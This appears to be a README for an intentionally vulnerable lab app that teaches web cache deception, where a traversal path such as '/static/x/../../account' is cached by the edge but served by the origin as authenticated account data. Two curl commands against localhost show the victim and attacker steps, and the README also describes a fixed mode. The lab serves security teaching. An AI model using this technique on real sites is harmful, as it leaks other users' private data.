# Web Cache Deception via Static-Directory Rule

This challenge demonstrates directory-rule web cache deception: the shared cache caches anything whose *raw* path starts under `/static/` or `/assets/`, without normalizing path-traversal segments first. The origin, however, normalizes the path before routing, so `/static/x/../../account` is cached by the edge (because it superficially starts with `/static/`) while actually being served as the dynamic, authenticated `/account` response by the origin.

## How to run it

```bash
go run main.go serve
```

## Endpoints

- `GET /account` — authenticated account data
- `GET /static/<anything>` — generic static asset content

## Exploiting it

```bash
# victim, authenticated, requests a traversal path that looks static to the cache
curl --path-as-is -H "Authorization: Bearer victim-secret-token" "http://localhost:8080/static/x/../../account"

# attacker, unauthenticated, requests the same path and receives the victim's cached data
curl --path-as-is "http://localhost:8080/static/x/../../account"
```

## Modes

The server supports two modes, toggled with the `--vulnerable` flag on the `serve` command (defaults to `true`):

```bash
# vulnerable: the cache decides cacheability from the raw, un-normalized path prefix
go run main.go serve --vulnerable=true

# fixed: the static-directory caching rule is never applied to a path that normalizes outside of it
go run main.go serve --vulnerable=false
```

## Disclaimer

This challenge is intentionally vulnerable. Do not deploy it on a publicly accessible server, as this could expose you to attacks.

Learn more about API security at [Cerberauth](https://www.cerberauth.com/)
